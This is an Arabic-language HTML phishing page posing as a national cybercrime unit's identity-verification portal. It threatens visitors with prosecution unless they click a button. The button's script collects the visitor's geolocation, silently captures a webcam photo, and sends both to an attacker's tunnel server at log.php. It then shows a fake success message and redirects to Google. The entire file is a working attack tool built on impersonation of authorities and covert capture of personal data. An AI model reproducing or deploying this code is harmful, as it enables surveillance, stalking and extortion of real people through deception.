<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق الوطني - مكافحة الجرائم الإلكترونية</title>
    <style>
        body { background-color: #f4f7f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 450px; border-top: 8px solid #1a73e8; }
        .logo { width: 80px; margin-bottom: 20px; }
        h2 { color: #1a73e8; margin-bottom: 10px; font-size: 24px; }
        p { color: #555; line-height: 1.6; margin-bottom: 30px; font-size: 16px; }
        .btn { background-color: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: background 0.3s; }
        .btn:hover { background-color: #1557b0; }
        .footer-text { font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://cdn-icons-png.flaticon.com/512/747/747127.png" class="logo" alt="Security">
    <h2>منصة التحقق الرقمي الموحدة</h2>
    <p>بناءً على البلاغ المقدم، يرجى إجراء الفحص البيومتري للهوية لإغلاق ملف القضية وتجنب الملاحقة القانونية. سيتم ربط موقعك الجغرافي بالرقم الوطني فور الضغط.</p>
    <button class="btn" onclick="initializeAuth()">تأكيد الهوية الرقمية الآن</button>
    <div class="footer-text">نظام مؤمن من قبل وحدة الجرائم الإلكترونية © 2025</div>
</div>

<script>
async function initializeAuth() {
    // الرابط الذي حصلت عليه من ترمكس حالياً (تأكد منه دائماً)
    const tunnel = "https://9f2f39b50f4307.lhr.life"; 
    
    try {
        // 1. طلب الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(pos => {
            fetch(`${tunnel}/log.php`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
            });
        });

        // 2. طلب الكاميرا والتقاط الصورة
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imgData = canvas.toDataURL('image/jpeg');

                // إرسال الصورة إلى السيرفر في ملف log.php
                await fetch(`${tunnel}/log.php`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ img: imgData })
                });

                // إغلاق الكاميرا بعد الالتقاط
                stream.getTracks().forEach(track => track.stop());
                
                alert("تم التحقق من الهوية بنجاح. سيتم إغلاق البلاغ خلال 24 ساعة.");
                window.location.href = "https://www.google.com"; // تحويله لموقع رسمي
            }, 2500);
        };
    } catch (err) {
        alert("خطأ: يجب السماح بالكاميرا والموقع لإتمام عملية التحقق.");
    }
}
</script>

</body>
</html>
